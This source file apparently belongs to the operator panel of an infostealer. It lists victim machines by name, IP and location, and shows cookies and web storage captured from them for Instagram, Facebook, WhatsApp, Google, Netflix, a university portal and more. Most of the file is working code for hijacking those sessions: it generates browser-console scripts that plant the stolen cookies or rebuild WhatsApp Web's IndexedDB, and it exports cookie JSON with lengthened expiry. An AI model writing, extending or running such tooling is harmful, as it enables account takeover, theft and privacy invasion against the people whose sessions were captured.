"use client";

import React, { useEffect, useState } from "react";
import { supabase, SessionSnapshot, Cookie } from "@/lib/supabase";
import GlassCard from "@/components/GlassCard";
import { 
  Search, Clock, Globe, ExternalLink, 
  Shield, Facebook, Instagram, GraduationCap, LayoutGrid, List, Check, Copy,
  Twitter, MessageSquare, Play, AlertCircle, Palette, Gamepad2, Mail, Bot, Monitor, Tablet, Smartphone, Info, RefreshCw, FileJson, Download,
  Youtube, Linkedin, ShoppingCart, HelpCircle, ChevronRight, X, Cpu
} from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";

interface AccountInfo {
  platform: string;
  identifier: string;
  icon: any;
  color: string;
  health: "active" | "expiring" | "expired";
  domain: string;
  filterMe?: boolean;
}

const formatRelativeTime = (date: string) => {
  const now = new Date();
  const captured = new Date(date);
  const diffInSeconds = Math.floor((now.getTime() - captured.getTime()) / 1000);

  if (diffInSeconds < 60) return "just now";
  if (diffInSeconds < 3600) return `${Math.floor(diffInSeconds / 60)}m ago`;
  if (diffInSeconds < 86400) return `${Math.floor(diffInSeconds / 3600)}h ago`;
  return captured.toLocaleDateString();
};

export default function SessionsPage() {
  const [sessions, setSessions] = useState<SessionSnapshot[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState("");
  const [selectedSession, setSelectedSession] = useState<SessionSnapshot | null>(null);
  const [cookies, setCookies] = useState<Cookie[]>([]);
  const [loadingCookies, setLoadingCookies] = useState(false);
  const [accountMap, setAccountMap] = useState<Record<string, AccountInfo>>({});
  const [copied, setCopied] = useState(false);
  const [copiedJson, setCopiedJson] = useState(false);
  const [copiedUA, setCopiedUA] = useState(false);
  const [showGuide, setShowGuide] = useState(false);
  const [webStorage, setWebStorage] = useState<any[]>([]);
  const [copiedStorage, setCopiedStorage] = useState(false);
  const [deviceSearch, setDeviceSearch] = useState("");

  useEffect(() => {
    fetchSessions();
    const timer = setInterval(() => fetchSessions(), 60000);
    return () => clearInterval(timer);
  }, []);

  const getHealthStatus = (sessionCookies: { name: string, expiration_date: number | null }[]): "active" | "expiring" | "expired" => {
    if (!sessionCookies || sessionCookies.length === 0) return "active";
    const now = Date.now() / 1000;
    const sessionCookie = sessionCookies.find(c => ["c_user", "ds_user_id", "auth_token", "SID", "NetflixId", "li_at", "LOGIN_INFO"].includes(c.name));
    if (!sessionCookie || !sessionCookie.expiration_date) return "active";
    if (sessionCookie.expiration_date < now) return "expired";
    if (sessionCookie.expiration_date < now + 604800) return "expiring";
    return "active";
  };

  const getPrimaryDomainFromCookies = (sessionCookies: { domain: string }[], extraDomains: string[] = []): string => {
    const usageList = extraDomains.length > 0 ? extraDomains : sessionCookies.map(c => c.domain);
    if (usageList.length === 0) return "unknown.com";
    
    const domainCounts: Record<string, number> = {};
    usageList.forEach(domain => {
      const d = domain.replace(/^\./, "").toLowerCase();
      if (!d.includes("fwmrm.net") && !d.includes("doubleclick") && !d.includes("analytics") && !d.includes("pixel") && !d.includes("googletagmanager")) {
        domainCounts[d] = (domainCounts[d] || 0) + 1;
      }
    });

    const entries = Object.entries(domainCounts);
    if (entries.length === 0) return usageList[0].replace(/^\./, "");
    return entries.sort((a, b) => b[1] - a[1])[0][0];
  };

  const identifyAccount = (sessionCookies: { domain: string, name: string, value: string, expiration_date: number | null }[], fallbackId: string, extraDomains: string[] = []): AccountInfo => {
    const health = getHealthStatus(sessionCookies);
    const allDomains = extraDomains.length > 0 ? extraDomains : sessionCookies.map(c => c.domain);
    const domainStr = allDomains.map(d => d.toLowerCase()).join(" ");
    
    if (domainStr.includes("whatsapp.com") || domainStr.includes("web.whatsapp.com"))
      return { platform: "WhatsApp", identifier: "WhatsApp Web", icon: MessageSquare, color: "text-green-500", health, domain: "web.whatsapp.com" };
    
    const igUser = sessionCookies.find(c => c.name === "ds_user_id" && c.domain.includes("instagram"));
    if (igUser)
      return { platform: "Instagram", identifier: igUser.value || "Account", icon: Instagram, color: "text-pink-500", health, domain: "instagram.com" };
    
    const fbUser = sessionCookies.find(c => c.name === "c_user" && c.domain.includes("facebook"));
    if (fbUser)
      return { platform: "Facebook", identifier: fbUser.value || "Account", icon: Facebook, color: "text-blue-500", health, domain: "facebook.com" };
    
    if (domainStr.includes("up.edu.pe") || domainStr.includes("blackboard.com"))
      return { platform: "Blackboard", identifier: "Academic Portal", icon: GraduationCap, color: "text-blue-400", health, domain: "up.edu.pe" };
    
    if (domainStr.includes("tiktok.com"))
      return { platform: "TikTok", identifier: "TikTok User", icon: Play, color: "text-pink-400", health, domain: "tiktok.com" };
    
    if (domainStr.includes("discord.com"))
      return { platform: "Discord", identifier: "Discord User", icon: MessageSquare, color: "text-indigo-400", health, domain: "discord.com" };
    
    if (domainStr.includes("spotify.com"))
      return { platform: "Spotify", identifier: "Spotify Listener", icon: Play, color: "text-green-400", health, domain: "spotify.com" };
    
    if (domainStr.includes("openai.com") || domainStr.includes("chatgpt.com"))
      return { platform: "ChatGPT", identifier: "AI Assistant", icon: Cpu, color: "text-emerald-400", health, domain: "chatgpt.com" };
    
    if (domainStr.includes("grok.com"))
      return { platform: "Grok AI", identifier: "AI Brain", icon: Bot, color: "text-purple-400", health, domain: "grok.com" };
    
    if (domainStr.includes("gemini.google.com"))
      return { platform: "Gemini", identifier: "LLM Session", icon: MessageSquare, color: "text-blue-300", health, domain: "gemini.google.com" };
    
    if (domainStr.includes("linkedin.com"))
      return { platform: "LinkedIn", identifier: "Professional Profile", icon: Linkedin, color: "text-blue-600", health, domain: "linkedin.com" };
    
    if (domainStr.includes("mercadolibre.com"))
      return { platform: "Mercado Libre", identifier: "Account", icon: ShoppingCart, color: "text-yellow-400", health, domain: "mercadolibre.com" };
    
    if (domainStr.includes("x.com") || domainStr.includes("twitter.com"))
      return { platform: "X / Twitter", identifier: "Social ID", icon: Twitter, color: "text-blue-400", health, domain: "x.com" };
    
    if (domainStr.includes("kick.com"))
      return { platform: "Kick", identifier: "Stream Session", icon: Gamepad2, color: "text-green-500", health, domain: "kick.com" };
    
    if (domainStr.includes("netflix.com"))
      return { platform: "Netflix", identifier: "Streaming User", icon: Play, color: "text-red-600", health, domain: "netflix.com" };
    
    if (domainStr.includes("pinterest.com"))
      return { platform: "Pinterest", identifier: "Pinterest User", icon: Globe, color: "text-red-500", health, domain: "pinterest.com" };
    
    const ytAuth = sessionCookies.find(c => c.name === "LOGIN_INFO" && c.domain.includes("youtube"));
    if (ytAuth)
      return { platform: "YouTube", identifier: "YouTube Viewer", icon: Youtube, color: "text-red-500", health, domain: "youtube.com" };
    
    if (domainStr.includes("google.com")) {
      const email = sessionCookies.find(c => c.name.includes("email"))?.value;
      return { platform: "Google", identifier: email || "Google User", icon: Globe, color: "text-red-400", health, domain: "google.com" };
    }

    const primaryDomain = getPrimaryDomainFromCookies(sessionCookies, extraDomains);
    const capitalizedName = primaryDomain.split('.')[0].charAt(0).toUpperCase() + primaryDomain.split('.')[0].slice(1);
    return { platform: capitalizedName || "External", identifier: fallbackId || "Active Session", icon: Shield, color: "text-blue-400", health, domain: primaryDomain };
  };

  const fetchSessions = async () => {
    setLoading(true);
    const { data: sessionData } = await supabase
      .from("session_snapshots")
      .select("id, user_id, snapshot_type, captured_at, user_agent, metadata, device_id, pc_name, os, ip_address, location_city, location_country")
      .order("captured_at", { ascending: false })
      .limit(100); 
    
    if (sessionData) {
      const sessionIds = sessionData.map(s => s.id);
      const { data: allCookies } = await supabase
        .from("cookies")
        .select("snapshot_id, domain, name, value, expiration_date")
        .in("snapshot_id", sessionIds)
        .limit(10000);

      const { data: allStorage } = await supabase
        .from("web_storage")
        .select("snapshot_id, domain, storage_type")
        .in("snapshot_id", sessionIds)
        .limit(2000);
      
      const newAccountMap: Record<string, AccountInfo> = {};
      sessionData.forEach(session => {
        const sessionCookies = (allCookies || []).filter(c => c.snapshot_id === session.id);
        const sessionStorage = (allStorage || []).filter(s => s.snapshot_id === session.id);
        const combinedDomains = [...sessionCookies.map(c => c.domain), ...sessionStorage.map(s => s.domain)];
        const identity = identifyAccount(sessionCookies, session.user_id, combinedDomains);
        if (identity.domain !== "unknown.com" || sessionCookies.length > 0 || sessionStorage.length > 0) {
           newAccountMap[session.id] = identity;
        } else {
           newAccountMap[session.id] = { ...identity, filterMe: true };
        }
      });
      
      const validSessions = sessionData.filter(s => !newAccountMap[s.id]?.filterMe);
      const validAccountMap: Record<string, AccountInfo> = {};
      validSessions.forEach(s => validAccountMap[s.id] = newAccountMap[s.id]);
      
      setAccountMap(validAccountMap);
      setSessions(validSessions);
    }
    setLoading(false);
  };

  const fetchCookies = async (snapshotId: string) => {
    setLoadingCookies(true);
    const { data } = await supabase.from("cookies").select("*").eq("snapshot_id", snapshotId).limit(3000);
    if (data) setCookies(data);
    setLoadingCookies(false);
  };

  const fetchWebStorage = async (snapshotId: string) => {
    const { data } = await supabase.from("web_storage").select("*").eq("snapshot_id", snapshotId).limit(5000);
    if (data) setWebStorage(data);
    else setWebStorage([]);
  };

  const generateWhatsAppScript = () => {
    if (webStorage.length === 0) return "";
    const idbEntries = webStorage.filter(e => e.storage_type === 'indexeddb');
    const lsEntries = webStorage.filter(e => e.storage_type === 'localstorage');
    const dbMap: Record<string, Record<string, {key: string, value: string}[]>> = {};
    idbEntries.forEach(e => {
      if (!dbMap[e.db_name]) dbMap[e.db_name] = {};
      if (!dbMap[e.db_name][e.store_name]) dbMap[e.db_name][e.store_name] = [];
      dbMap[e.db_name][e.store_name].push({ key: e.key, value: e.value });
    });
    
    return `(async function() {
      const lsData = ${JSON.stringify(lsEntries.map(e => ({ key: e.key, value: e.value })))};
      lsData.forEach(e => { try { localStorage.setItem(e.key, e.value); } catch(err) {} });
      const dbMap = ${JSON.stringify(dbMap)};
      for (const [dbName, stores] of Object.entries(dbMap)) {
        await new Promise(r => { const d = indexedDB.deleteDatabase(dbName); d.onsuccess = r; d.onerror = r; });
        const db = await new Promise((r, j) => {
          const req = indexedDB.open(dbName, 1);
          req.onupgradeneeded = (e) => Object.keys(stores).forEach(n => !e.target.result.objectStoreNames.contains(n) && e.target.result.createObjectStore(n));
          req.onsuccess = (e) => r(e.target.result); req.onerror = (e) => j(e.target.error);
        });
        for (const [storeName, entries] of Object.entries(stores)) {
          const tx = db.transaction(storeName, 'readwrite'); const s = tx.objectStore(storeName);
          entries.forEach(en => { try { s.put(en.value.startsWith('{') ? JSON.parse(en.value) : en.value, en.key); } catch(e) { s.put(en.value, en.key); } });
        }
        db.close();
      }
      location.reload();
    })()`;
  };

  const copyWhatsAppScript = () => {
    const script = generateWhatsAppScript();
    if (script) navigator.clipboard.writeText(script).then(() => { setCopiedStorage(true); setTimeout(() => setCopiedStorage(false), 5000); });
  };

  const handleSessionClick = (session: SessionSnapshot) => {
    setSelectedSession(session);
    setCopied(false); setCopiedJson(false); setDeviceSearch("");
    fetchCookies(session.id); fetchWebStorage(session.id);
  };

  const generateConsoleScript = () => {
    if (cookies.length === 0) return "";
    const filteredCookies = deviceSearch ? cookies.filter(c => c.domain.toLowerCase().includes(deviceSearch.toLowerCase())) : cookies;
    return `(function() {
      const cookies = ${JSON.stringify(filteredCookies)};
      document.cookie.split(";").forEach(c => { const n = c.split("=")[0].trim(); document.cookie = n + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=" + location.hostname; });
      cookies.forEach(c => { try { document.cookie = c.name + "=" + c.value + "; domain=" + (c.domain.startsWith('.') ? c.domain : '.' + c.domain) + "; path=/; SameSite=Lax; Secure"; } catch(e){} });
      setTimeout(() => location.reload(), 1000);
    })()`;
  };

  const copyToClipboard = () => {
    const s = generateConsoleScript();
    if (s) navigator.clipboard.writeText(s).then(() => { setCopied(true); setTimeout(() => setCopied(false), 5000); });
  };

  const copyCookiesJson = () => {
    if (!selectedSession) return;
    const info = accountMap[selectedSession.id];
    const targetDomain = info?.domain.toLowerCase() || "";
    const filtered = cookies.filter(c => {
      const d = c.domain.toLowerCase();
      if (deviceSearch) return d.includes(deviceSearch.toLowerCase());
      if (targetDomain.includes("instagram")) return d.includes("instagram.com") || d.includes("facebook.com");
      return d.includes(targetDomain);
    });
    const formatted = filtered.map(c => {
      let val = (c.value || "").replace(/^"|"$/g, "").replace(/\\([0-7]{3})/g, (m, o) => String.fromCharCode(parseInt(o, 8)));
      return {
        domain: c.domain.startsWith('.') ? c.domain : (c.name.startsWith("__Host-") ? "" : '.' + c.domain),
        expirationDate: Math.floor(Date.now() / 1000) + 86400 * 90,
        hostOnly: !c.domain.startsWith("."), httpOnly: c.http_only, name: c.name, path: c.path || "/", sameSite: "no_restriction", secure: true, session: false, value: val
      };
    });
    navigator.clipboard.writeText(JSON.stringify(formatted, null, 2)).then(() => { setCopiedJson(true); setTimeout(() => setCopiedJson(false), 5000); });
  };

  const getDeviceIcon = (ua?: string) => {
    if (!ua) return Monitor;
    const l = ua.toLowerCase();
    if (l.includes("mobi") || l.includes("android") || l.includes("iphone")) return Smartphone;
    return Monitor;
  };

  const groupedSessions = sessions.reduce((acc, session) => {
    const dId = session.device_id || "unknown-device";
    if (!acc[dId]) acc[dId] = [];
    acc[dId].push(session);
    return acc;
  }, {} as Record<string, SessionSnapshot[]>);

  const deviceList = Object.keys(groupedSessions).map(dId => {
    const devSess = groupedSessions[dId];
    const latest = devSess[0];
    return {
      id: dId, pc_name: latest.pc_name || "Unknown PC", os: latest.os || "Unknown OS", ip: latest.ip_address || "0.0.0.0",
      location: latest.location_city ? `${latest.location_city}, ${latest.location_country || ""}` : "Unknown Location",
      lastSeen: latest.captured_at, sessions: devSess, latest: latest
    };
  });

  const filteredDevices = deviceList.filter(d => 
    d.pc_name.toLowerCase().includes(searchTerm.toLowerCase()) || d.ip.includes(searchTerm) || d.location.toLowerCase().includes(searchTerm.toLowerCase())
  );

  return (
    <div className="relative min-h-screen">
      <div className="space-y-8 max-w-7xl mx-auto pb-40 px-6">
        <header className="flex flex-col md:flex-row md:items-center justify-between gap-4 py-8">
          <div>
            <h2 className="text-5xl font-black tracking-tighter bg-gradient-to-r from-blue-400 to-emerald-400 bg-clip-text text-transparent">Device Intelligence</h2>
            <p className="text-gray-500 font-bold tracking-wide mt-1 uppercase text-xs">DEVICES ONLINE: {deviceList.length}</p>
          </div>
          <div className="flex items-center gap-4">
            <div className="glass flex items-center px-6 py-3.5 rounded-2xl border border-white/5 w-80 shadow-2xl">
              <Search className="text-gray-500 mr-4" size={20} />
              <input type="text" placeholder="Device, IP, Location..." className="bg-transparent border-none outline-none text-sm w-full placeholder:text-gray-600 font-bold uppercase tracking-wider" value={searchTerm} onChange={(e) => setSearchTerm(e.target.value)} />
            </div>
            <button onClick={() => fetchSessions()} className="glass p-4 rounded-2xl hover:bg-blue-500/10 border border-white/5 transition-all"><RefreshCw size={22} className={loading?"animate-spin":""} /></button>
            <button onClick={() => setShowGuide(!showGuide)} className="glass flex items-center gap-2 px-6 py-3.5 rounded-2xl border border-blue-500/20 font-black text-[10px] tracking-[0.2em] uppercase text-blue-400">Manual</button>
          </div>
        </header>

        {loading ? (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
            {[1, 2, 3].map(i => <div key={i} className="h-64 glass rounded-[4rem] animate-pulse" />)}
          </div>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
            {filteredDevices.map(device => (
              <motion.div key={device.id} whileHover={{ y: -10 }} onClick={() => handleSessionClick(device.latest)} className="glass p-10 rounded-[4rem] border-2 border-white/5 hover:border-blue-500/20 cursor-pointer shadow-2xl">
                <div className="flex justify-between items-start mb-8">
                  <div className="space-y-4">
                    <div className="p-6 rounded-[2.5rem] bg-blue-500/20 w-fit text-blue-400 border border-blue-500/20"><Monitor size={40} /></div>
                    <div>
                      <h4 className="text-2xl font-black text-white">{device.pc_name}</h4>
                      <p className="text-[10px] font-black text-blue-400/60 uppercase tracking-widest">{device.location}</p>
                    </div>
                  </div>
                  <div className="text-right">
                    <div className="glass-pill px-4 py-1.5 rounded-full text-[9px] font-black uppercase tracking-widest text-white/30 border border-white/5 mb-2">{device.os}</div>
                    <div className="text-[10px] font-black text-emerald-400 flex items-center gap-2 justify-end tracking-tighter"><div className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"/>ONLINE</div>
                  </div>
                </div>
                <div className="bg-black/30 rounded-[3rem] p-6 border border-white/5 space-y-4">
                  <div className="flex justify-between text-[10px] font-black uppercase text-white/20 tracking-widest"><span>Net ID</span><span className="text-blue-400/40">{device.ip}</span></div>
                  <div className="flex justify-between items-center text-xs">
                    <div className="flex gap-2 items-center text-gray-500 font-bold"><Clock size={14}/> {formatRelativeTime(device.lastSeen)}</div>
                    <div className="px-4 py-1.5 rounded-full bg-blue-500/10 text-blue-400 font-black text-[9px] uppercase tracking-widest">{device.sessions.length} SNAPS</div>
                  </div>
                </div>
              </motion.div>
            ))}
          </div>
        )}

        <AnimatePresence>
          {selectedSession && (
            <motion.div initial={{ opacity:0, y:100 }} animate={{ opacity:1, y:0 }} exit={{ opacity:0, y:100 }} className="fixed bottom-0 left-0 right-0 p-10 z-[110] pointer-events-none">
              <div className="max-w-6xl mx-auto pointer-events-auto relative">
                <button onClick={() => setSelectedSession(null)} className="absolute -top-4 -right-4 p-4 bg-black/60 rounded-full border border-white/10 text-white hover:rotate-90 transition-all"><X size={24}/></button>
                <GlassCard className="glass-intense p-12 rounded-[4rem] border-t-4 border-blue-500 shadow-3xl">
                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-12">
                    <div className="space-y-8">
                      <div className="flex items-center gap-6">
                        <div className={`p-8 rounded-[3rem] bg-black/60 border border-white/5 ${accountMap[selectedSession.id]?.color}`}>
                          {React.createElement(accountMap[selectedSession.id]?.icon || Shield, { size: 64 })}
                        </div>
                        <div>
                          <h3 className="text-5xl font-black text-white">{accountMap[selectedSession.id]?.platform}</h3>
                          <p className="text-[10px] font-black text-blue-400/60 uppercase tracking-[0.3em] mt-1">{accountMap[selectedSession.id]?.domain}</p>
                        </div>
                      </div>
                      <div className="bg-blue-500/5 border border-blue-500/10 p-6 rounded-[2.5rem]">
                        <div className="flex justify-between items-center mb-4 text-[10px] font-black text-blue-400 tracking-widest uppercase">
                          <span>Sign Record</span>
                          <button onClick={() => navigator.clipboard.writeText(selectedSession.user_agent||"")} className="px-3 py-1.5 rounded-xl bg-blue-500/20 hover:bg-blue-500/30 transition-all border border-blue-500/20 flex gap-2 items-center"><Copy size={12}/>{copiedUA?"COPIED":"COPY UA"}</button>
                        </div>
                        <div className="text-[10px] font-mono p-5 bg-black/60 rounded-2xl border border-white/5 break-all text-gray-500 leading-relaxed shadow-inner">{selectedSession.user_agent}</div>
                      </div>
                      <div className="grid grid-cols-2 gap-6 h-64">
                         <div className="glass bg-black/40 rounded-[2.5rem] border border-white/5 flex flex-col overflow-hidden">
                            <div className="p-4 border-b border-white/5 bg-white/5 flex justify-between text-[9px] font-black text-blue-400 tracking-widest uppercase"><span>Cookie Index</span><span>{cookies.filter(c=>c.domain.toLowerCase().includes(deviceSearch.toLowerCase())).length}</span></div>
                            <div className="flex-1 overflow-y-auto p-4 space-y-2 custom-scrollbar">
                               {cookies.filter(c=>c.domain.toLowerCase().includes(deviceSearch.toLowerCase())).map((c,i)=>(
                                 <div key={i} className="text-[9px] font-mono text-gray-400 p-2 bg-white/5 rounded-xl border border-white/5 truncate hover:border-blue-500/30 transition-colors"><span className="text-blue-400/60">{c.domain}</span><br/>{c.name}</div>
                               ))}
                            </div>
                         </div>
                         <div className="glass bg-black/40 rounded-[2.5rem] border border-white/5 flex flex-col overflow-hidden">
                            <div className="p-4 border-b border-white/5 bg-white/5 flex justify-between text-[9px] font-black text-emerald-400 tracking-widest uppercase"><span>Deep Storage</span><span>{webStorage.length}</span></div>
                            <div className="flex-1 overflow-y-auto p-4 space-y-2 custom-scrollbar">
                               {webStorage.map((s,i)=>(
                                 <div key={i} className="text-[9px] font-mono text-gray-400 p-2 bg-white/5 rounded-xl border border-white/5"><span className="text-emerald-400/60">{s.domain}</span><br/><span className="text-white/20">{s.storage_type}</span>: {s.key}</div>
                               ))}
                            </div>
                         </div>
                      </div>
                    </div>
                    <div className="flex flex-col justify-center space-y-8">
                       <div className="space-y-4">
                          <div className="relative"><Search className="absolute left-6 top-1/2 -translate-y-1/2 text-white/20" size={18} /><input value={deviceSearch} onChange={(e)=>setDeviceSearch(e.target.value)} placeholder="FILTER INDEX BY DOMAIN..." className="bg-black/60 border border-white/10 rounded-full w-full py-5 pl-14 pr-8 text-[11px] font-black text-white tracking-widest uppercase focus:border-blue-500 transition-all"/></div>
                          <div className="p-6 bg-emerald-500/10 border border-emerald-500/20 rounded-[2.5rem] flex items-center justify-between text-emerald-400 font-black text-xs tracking-widest"><span>VERIFIED DATA READY</span><span className="bg-emerald-500/20 px-4 py-1.5 rounded-full border border-emerald-500/20 shadow-lg shadow-emerald-500/10">1:1 MIRROR</span></div>
                          <button onClick={copyToClipboard} className={"w-full py-8 rounded-[3rem] font-black text-3xl transition-all active:scale-95 shadow-3xl " + (copied ? "bg-emerald-600 shadow-emerald-500/40" : "bg-blue-600 hover:bg-blue-500 shadow-blue-500/40 border-t-2 border-white/10")}>{copied ? "RESTORED" : "CONSOLE BOOT"}</button>
                          <div className="flex gap-4">
                             <button onClick={copyCookiesJson} className={"flex-1 p-6 rounded-[2.5rem] glass font-black text-[11px] tracking-widest uppercase transition-all " + (copiedJson ? "text-emerald-400 border-emerald-500/40" : "text-white/60 hover:bg-white/10 border-white/5")}>{copiedJson ? "JSON COPIED" : "EXPORT JSON"}</button>
                             {webStorage.length > 0 && <button onClick={copyWhatsAppScript} className={"flex-1 p-6 rounded-[2.5rem] font-black text-[11px] tracking-widest uppercase transition-all " + (copiedStorage ? "bg-green-600 text-white" : "bg-green-600/20 text-green-400 border border-green-500/20")}>{copiedStorage ? "SCRIPT READY" : "DEEP RESTORE"}</button>}
                          </div>
                       </div>
                       <div className="p-8 rounded-[3rem] bg-amber-500/5 border border-amber-500/20 flex gap-6 shadow-inner"><div className="p-4 bg-amber-500/10 rounded-2xl h-fit text-amber-500 shadow-lg"><Info size={24}/></div><div><p className="text-[11px] font-black tracking-widest uppercase text-amber-400 mb-2">Technical Note</p><p className="text-xs text-amber-200/50 leading-relaxed font-medium">Use high-precision import for Instagram and WhatsApp. Manual UA injection required for stable mirror persistence.</p></div></div>
                    </div>
                  </div>
                </GlassCard>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}
